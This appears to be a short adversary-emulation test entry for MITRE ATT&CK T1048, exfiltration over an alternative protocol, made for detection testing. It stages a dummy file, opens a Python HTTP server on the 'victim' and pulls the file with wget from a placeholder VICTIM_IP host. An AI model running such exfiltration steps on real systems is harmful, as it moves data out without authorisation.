attack_technique: T1048
display_name: Exfiltration Over Alternative Protocol
tactic: Exfiltration
description: Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.

      1. Victim System Configuration:
          mkdir /tmp/victim-staging-area
          echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt

      2. Using Python to establish a one-line HTTP server on victim system:
          cd /tmp/victim-staging-area
          python -m SimpleHTTPServer 1337

      3. To retrieve the data from an adversary system:
          wget http://VICTIM_IP:1337/victim-file.txt
